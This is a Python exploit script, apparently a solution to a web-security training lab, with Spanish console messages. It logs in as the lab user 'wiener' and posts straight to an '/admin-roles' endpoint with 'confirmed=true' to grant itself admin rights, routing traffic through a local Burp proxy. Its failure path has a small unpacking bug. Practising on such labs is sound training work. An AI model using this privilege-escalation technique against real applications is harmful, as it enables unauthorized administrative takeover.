import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) !=2:
        print(f"(+) Uso: {sys.argv[0]} <url>")
        print(f"(+) Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    username,login_session = login_user(session,base_url,"wiener","peter")
    if login_session:
        upgrade_user(session,base_url,username)

def login_user(session,base_url,username,password):
    login_url = f"{base_url}/login"
    credential = {'username': username,'password': password}
    response = session.post(login_url,data=credential,verify=False,proxies=proxies_setting)
    if "Log out" in response.text:
        print(f"(+) Login exitoso como user {username}")
        return username, True
    else:
        print(f"(-) Login fallido para el user {username}")
        return False
    
def upgrade_user(session,base_url,username):
    url_admin = f"{base_url}/admin-roles"
    data_upgrade = {
        'action': 'upgrade',
        'confirmed': 'true',
        'username': username
    }
    response = session.post(url_admin,data=data_upgrade,verify=False,proxies=proxies_setting)
    if "wiener (ADMIN)" in response.text:
        print(f"(+) Upgrade user {username} successful...")
    else:
        print(f"(-) Upgrade user {username} unsuccesfull")        

if __name__ == "__main__":
    main()
